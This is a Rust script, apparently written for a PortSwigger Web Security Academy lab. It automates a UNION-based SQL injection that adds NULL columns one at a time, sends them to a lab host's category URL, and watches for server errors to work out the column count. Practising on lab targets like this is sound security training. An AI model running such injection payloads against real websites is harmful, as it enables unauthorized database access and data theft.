use reqwest::Client;
use scraper::{Html,ElementRef,Selector};
use std::error::Error;

fn check_internal_server_error(html_text: &str) -> bool {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse(r#"p[class="is-warning"]"#).unwrap();
    let text = document
        .select(&sel)
        .next()
        .map(|el| el.text().collect::<Vec<_>>().join(" ").trim().to_string());
    println!("{:?}", &text);

    match text {
        Some(ref t) if t == "Internal Server Error" => false,
        Some(_) => true,
        None => true,
    }
}




#[tokio::main]
async fn main()->Result<(), Box<dyn Error>>{
    let host="https://0a8d00c604aa166e824a748200b0007b.web-security-academy.net";
    let client=Client::builder().danger_accept_invalid_certs(true).cookie_store(true).build()?;
    let request=client.get(host).send().await?;
    let request_body=request.text().await?;
    let product_url = format!("{}/category=", host);
    let null_value = "null";
    let comment = "--";
    let mut payload1 = format!("{}'UNION select {}", product_url, null_value);
    let comma = ",";
    let mut i = false;

    while i==false{
        let resp_text = client.get(format!("{}{}", payload1, comment)).send().await?.text().await?;
        let answer = check_internal_server_error(&resp_text);
        println!("executed payload: {} ", format!("{}{}", payload1, comment));

        if answer == false {
            payload1 = payload1 + comma + null_value;
        } else {
            i = true;
            let payload = format!("{}{}", payload1, comment);
        }


    }
    Ok(())
}
  